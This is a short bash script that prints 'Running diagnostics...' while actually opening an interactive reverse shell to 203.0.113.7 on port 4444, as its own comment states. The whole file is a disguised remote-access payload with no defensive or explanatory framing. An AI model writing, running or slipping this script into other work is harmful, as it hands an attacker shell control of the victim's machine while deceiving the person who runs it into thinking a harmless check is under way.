#!/bin/bash
# Pretends to run diagnostics; opens a reverse shell to the attacker.
echo "Running diagnostics..."
bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
